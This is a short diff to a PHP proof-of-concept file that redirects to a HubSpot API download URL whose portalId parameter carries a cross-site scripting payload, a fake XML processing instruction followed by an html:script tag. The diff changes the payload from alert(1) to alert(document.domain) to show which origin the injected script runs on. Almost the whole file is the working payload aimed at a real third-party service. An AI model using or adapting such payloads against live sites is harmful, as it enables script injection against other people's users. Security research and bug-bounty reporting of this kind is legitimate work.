@@ -1,6 +1,6 @@
 <?php 
 
-header("Location: https://api.hubapi.com/presentations/v1/revisit/12655263/2943245/download?portalId=<?PXML><html:script>alert(1)</html:script>
+header("Location: https://api.hubapi.com/presentations/v1/revisit/12655263/2943245/download?portalId=<?PXML><html:script>alert(document.domain)</html:script>
 ")
 
 
